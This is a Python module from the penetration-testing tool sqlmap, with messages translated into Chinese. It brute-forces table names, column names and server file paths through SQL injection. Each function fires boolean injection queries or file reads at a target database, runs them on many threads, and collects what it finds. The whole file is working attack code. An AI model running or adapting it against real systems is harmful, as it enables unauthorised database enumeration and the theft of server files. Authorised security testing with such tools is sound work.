#!/usr/bin/env python

"""
Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from __future__ import division

import time

from lib.core.common import Backend
from lib.core.common import clearConsoleLine
from lib.core.common import dataToStdout
from lib.core.common import filterListValue
from lib.core.common import getFileItems
from lib.core.common import getPageWordSet
from lib.core.common import hashDBWrite
from lib.core.common import isNoneValue
from lib.core.common import ntToPosixSlashes
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import safeSQLIdentificatorNaming
from lib.core.common import safeStringFormat
from lib.core.common import unArrayizeValue
from lib.core.common import unsafeSQLIdentificatorNaming
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.decorators import stackedmethod
from lib.core.enums import DBMS
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapDataException
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.exception import SqlmapNoneDataException
from lib.core.settings import BRUTE_COLUMN_EXISTS_TEMPLATE
from lib.core.settings import BRUTE_TABLE_EXISTS_TEMPLATE
from lib.core.settings import METADB_SUFFIX
from lib.core.settings import UPPER_CASE_DBMSES
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.request import inject

def _addPageTextWords():
    wordsList = []

    infoMsg = "将网页上使用的单词添加到检查列表中"
    logger.info(infoMsg)
    pageWords = getPageWordSet(kb.originalPage)

    for word in pageWords:
        word = word.lower()

        if len(word) > 2 and not word[0].isdigit() and word not in wordsList:
            wordsList.append(word)

    return wordsList

@stackedmethod
def tableExists(tableFile, regex=None):
    if kb.choices.tableExists is None and not any(_ for _ in kb.injection.data if _ not in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)) and not conf.direct:
        warnMsg = "不建议在常规表存在检查中使用 '%s' 和/或 '%s'" % (PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.TIME], PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.STACKED])
        logger.warning(warnMsg)

        message = "您确定要继续吗？[y/N] "
        kb.choices.tableExists = readInput(message, default='N', boolean=True)

        if not kb.choices.tableExists:
            return None

    result = inject.checkBooleanExpression("%s" % safeStringFormat(BRUTE_TABLE_EXISTS_TEMPLATE, (randomInt(1), randomStr())))

    if result:
        errMsg = "由于检测到无效结果,无法使用表存在检查 "
        errMsg += "(很可能是由于所使用的注入无法区分错误结果)"
        raise SqlmapDataException(errMsg)

    pushValue(conf.db)

    if conf.db and Backend.getIdentifiedDbms() in UPPER_CASE_DBMSES:
        conf.db = conf.db.upper()

    message = "您想要使用哪个常见表(单词列表)文件？\n"
    message += "[1] 默认文件 '%s'(按 Enter 键)\n" % tableFile
    message += "[2] 自定义文件"
    choice = readInput(message, default='1')

    if choice == '2':
        message = "请提供自定义常见表文件的位置:\n"
        tableFile = readInput(message) or tableFile

    infoMsg = "使用 '%s' 中的项执行表存在检查" % tableFile
    logger.info(infoMsg)

    tables = getFileItems(tableFile, lowercase=Backend.getIdentifiedDbms() in (DBMS.ACCESS,), unique=True)
    tables.extend(_addPageTextWords())
    tables = filterListValue(tables, regex)

    for conf.db in (conf.db.split(',') if conf.db else [conf.db]):
        if conf.db and METADB_SUFFIX not in conf.db:
            infoMsg = "检查数据库 '%s'" % conf.db
            logger.info(infoMsg)

        threadData = getCurrentThreadData()
        threadData.shared.count = 0
        threadData.shared.limit = len(tables)
        threadData.shared.files = []
        threadData.shared.unique = set()

        def tableExistsThread():
            threadData = getCurrentThreadData()

            while kb.threadContinue:
                kb.locks.count.acquire()
                if threadData.shared.count < threadData.shared.limit:
                    table = safeSQLIdentificatorNaming(tables[threadData.shared.count], True)
                    threadData.shared.count += 1
                    kb.locks.count.release()
                else:
                    kb.locks.count.release()
                    break

                if conf.db and METADB_SUFFIX not in conf.db and Backend.getIdentifiedDbms() not in (DBMS.SQLITE, DBMS.ACCESS, DBMS.FIREBIRD):
                    fullTableName = "%s.%s" % (conf.db, table)
                else:
                    fullTableName = table

                if Backend.isDbms(DBMS.MCKOI):
                    _ = randomInt(1)
                    result = inject.checkBooleanExpression("%s" % safeStringFormat("%d=(SELECT %d FROM %s)", (_, _, fullTableName)))
                else:
                    result = inject.checkBooleanExpression("%s" % safeStringFormat(BRUTE_TABLE_EXISTS_TEMPLATE, (randomInt(1), fullTableName)))

                kb.locks.io.acquire()

                if result and table.lower() not in threadData.shared.unique:
                    threadData.shared.files.append(table)
                    threadData.shared.unique.add(table.lower())

                    if conf.verbose in (1, 2) and not conf.api:
                        clearConsoleLine(True)
                        infoMsg = "[%s] [INFO] 检索到:%s\n" % (time.strftime("%X"), unsafeSQLIdentificatorNaming(table))
                        dataToStdout(infoMsg, True)

                if conf.verbose in (1, 2):
                    status = '%d/%d 项 (%d%%)' % (threadData.shared.count, threadData.shared.limit, round(100.0 * threadData.shared.count / threadData.shared.limit))
                    dataToStdout("\r[%s] [INFO] 尝试了 %s" % (time.strftime("%X"), status), True)

                kb.locks.io.release()

        try:
            runThreads(conf.threads, tableExistsThread, threadChoice=True)
        except KeyboardInterrupt:
            warnMsg = "用户在表存在检查过程中中止。sqlmap将显示部分输出"
            logger.warning(warnMsg)

        clearConsoleLine(True)
        dataToStdout("\n")

        if not threadData.shared.files:
            warnMsg = "未找到表"
            if conf.db:
                warnMsg += "在数据库 '%s' 中" % conf.db
            logger.warning(warnMsg)
        else:
            for item in threadData.shared.files:
                if conf.db not in kb.data.cachedTables:
                    kb.data.cachedTables[conf.db] = [item]
                else:
                    kb.data.cachedTables[conf.db].append(item)

        for _ in ((conf.db, item) for item in threadData.shared.files):
            if _ not in kb.brute.tables:
                kb.brute.tables.append(_)

    conf.db = popValue()
    hashDBWrite(HASHDB_KEYS.KB_BRUTE_TABLES, kb.brute.tables, True)

    return kb.data.cachedTables

def columnExists(columnFile, regex=None):
    if kb.choices.columnExists is None and not any(_ for _ in kb.injection.data if _ not in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)) and not conf.direct:
        warnMsg = "不建议在常规列存在检查中使用 '%s' 和/或 '%s'" % (PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.TIME], PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.STACKED])
        logger.warning(warnMsg)

        message = "您确定要继续吗？[y/N] "
        kb.choices.columnExists = readInput(message, default='N', boolean=True)

        if not kb.choices.columnExists:
            return None

    if not conf.tbl:
        errMsg = "缺少表参数"
        raise SqlmapMissingMandatoryOptionException(errMsg)

    if conf.db and Backend.getIdentifiedDbms() in UPPER_CASE_DBMSES:
        conf.db = conf.db.upper()

    result = inject.checkBooleanExpression(safeStringFormat(BRUTE_COLUMN_EXISTS_TEMPLATE, (randomStr(), randomStr())))

    if result:
        errMsg = "由于检测到无效结果,无法使用列存在检查 "
        errMsg += "(很可能是由于所使用的注入无法区分错误结果)"
        raise SqlmapDataException(errMsg)

    message = "您想要使用哪个常见列(单词列表)文件？\n"
    message += "[1] 默认文件 '%s'(按 Enter 键)\n" % columnFile
    message += "[2] 自定义文件"
    choice = readInput(message, default='1')

    if choice == '2':
        message = "请提供自定义常见列文件的位置:\n"
        columnFile = readInput(message) or columnFile

    infoMsg = "使用 '%s' 中的项执行列存在检查" % columnFile
    logger.info(infoMsg)

    columns = getFileItems(columnFile, unique=True)
    columns.extend(_addPageTextWords())
    columns = filterListValue(columns, regex)

    table = safeSQLIdentificatorNaming(conf.tbl, True)

    if conf.db and METADB_SUFFIX not in conf.db and Backend.getIdentifiedDbms() not in (DBMS.SQLITE, DBMS.ACCESS, DBMS.FIREBIRD):
        table = "%s.%s" % (safeSQLIdentificatorNaming(conf.db), table)

    kb.threadContinue = True
    kb.bruteMode = True

    threadData = getCurrentThreadData()
    threadData.shared.count = 0
    threadData.shared.limit = len(columns)
    threadData.shared.files = []

    def columnExistsThread():
        threadData = getCurrentThreadData()

        while kb.threadContinue:
            kb.locks.count.acquire()
            if threadData.shared.count < threadData.shared.limit:
                column = safeSQLIdentificatorNaming(columns[threadData.shared.count])
                threadData.shared.count += 1
                kb.locks.count.release()
            else:
                kb.locks.count.release()
                break

            if Backend.isDbms(DBMS.MCKOI):
                result = inject.checkBooleanExpression(safeStringFormat("0<(SELECT COUNT(%s) FROM %s)", (column, table)))
            else:
                result = inject.checkBooleanExpression(safeStringFormat(BRUTE_COLUMN_EXISTS_TEMPLATE, (column, table)))

            kb.locks.io.acquire()

            if result:
                threadData.shared.files.append(column)

                if conf.verbose in (1, 2) and not conf.api:
                    clearConsoleLine(True)
                    infoMsg = "[%s] [INFO] 检索到:%s\n" % (time.strftime("%X"), unsafeSQLIdentificatorNaming(column))
                    dataToStdout(infoMsg, True)

            if conf.verbose in (1, 2):
                status = "%d/%d 项 (%d%%)" % (threadData.shared.count, threadData.shared.limit, round(100.0 * threadData.shared.count / threadData.shared.limit))
                dataToStdout("\r[%s] [INFO] 尝试了 %s" % (time.strftime("%X"), status), True)

            kb.locks.io.release()

    try:
        runThreads(conf.threads, columnExistsThread, threadChoice=True)
    except KeyboardInterrupt:
        warnMsg = "用户在列存在检查过程中中止。sqlmap将显示部分输出"
        logger.warning(warnMsg)
    finally:
        kb.bruteMode = False

    clearConsoleLine(True)
    dataToStdout("\n")

    if not threadData.shared.files:
        warnMsg = "未找到列"
        logger.warning(warnMsg)
    else:
        columns = {}

        for column in threadData.shared.files:
            if Backend.getIdentifiedDbms() in (DBMS.MYSQL,):
                result = not inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %s FROM %s WHERE %s REGEXP '[^0-9]')", (column, table, column)))
            elif Backend.getIdentifiedDbms() in (DBMS.SQLITE,):
                result = inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %s FROM %s WHERE %s NOT GLOB '*[^0-9]*')", (column, table, column)))
            elif Backend.getIdentifiedDbms() in (DBMS.MCKOI,):
                result = inject.checkBooleanExpression("%s" % safeStringFormat("0=(SELECT MAX(%s)-MAX(%s) FROM %s)", (column, column, table)))
            else:
                result = inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %s FROM %s WHERE ROUND(%s)=ROUND(%s))", (column, table, column, column)))

            if result:
                columns[column] = "numeric"
            else:
                columns[column] = "non-numeric"

        kb.data.cachedColumns[conf.db] = {conf.tbl: columns}

        for _ in ((conf.db, conf.tbl, item[0], item[1]) for item in columns.items()):
            if _ not in kb.brute.columns:
                kb.brute.columns.append(_)

        hashDBWrite(HASHDB_KEYS.KB_BRUTE_COLUMNS, kb.brute.columns, True)

    return kb.data.cachedColumns

@stackedmethod
def fileExists(pathFile):
    retVal = []

    message = "您想要使用哪个常见文件文件？\n"
    message += "[1] 默认文件 '%s'(按 Enter 键)\n" % pathFile
    message += "[2] 自定义文件"
    choice = readInput(message, default='1')

    if choice == '2':
        message = "请提供自定义常见文件文件的位置:\n"
        pathFile = readInput(message) or pathFile

    infoMsg = "使用 '%s' 中的项执行文件存在检查" % pathFile
    logger.info(infoMsg)

    paths = getFileItems(pathFile, unique=True)

    kb.bruteMode = True

    try:
        conf.dbmsHandler.readFile(randomStr())
    except SqlmapNoneDataException:
        pass
    except:
        kb.bruteMode = False
        raise

    threadData = getCurrentThreadData()
    threadData.shared.count = 0
    threadData.shared.limit = len(paths)
    threadData.shared.files = []

    def fileExistsThread():
        threadData = getCurrentThreadData()

        while kb.threadContinue:
            kb.locks.count.acquire()
            if threadData.shared.count < threadData.shared.limit:
                path = ntToPosixSlashes(paths[threadData.shared.count])
                threadData.shared.count += 1
                kb.locks.count.release()
            else:
                kb.locks.count.release()
                break

            try:
                result = unArrayizeValue(conf.dbmsHandler.readFile(path))
            except SqlmapNoneDataException:
                result = None

            kb.locks.io.acquire()

            if not isNoneValue(result):
                threadData.shared.files.append(result)

                if not conf.api:
                    clearConsoleLine(True)
                    infoMsg = "[%s] [INFO] 检索到:'%s'\n" % (time.strftime("%X"), path)
                    dataToStdout(infoMsg, True)

            if conf.verbose in (1, 2):
                status = '%d/%d 项 (%d%%)' % (threadData.shared.count, threadData.shared.limit, round(100.0 * threadData.shared.count / threadData.shared.limit))
                dataToStdout("\r[%s] [INFO] 尝试了 %s" % (time.strftime("%X"), status), True)

            kb.locks.io.release()

    try:
        runThreads(conf.threads, fileExistsThread, threadChoice=True)
    except KeyboardInterrupt:
        warnMsg = "用户在文件存在检查过程中中止。sqlmap将显示部分输出"
        logger.warning(warnMsg)
    finally:
        kb.bruteMode = False

    clearConsoleLine(True)
    dataToStdout("\n")

    if not threadData.shared.files:
        warnMsg = "未找到文件"
        logger.warning(warnMsg)
    else:
        retVal = threadData.shared.files

    return retVal
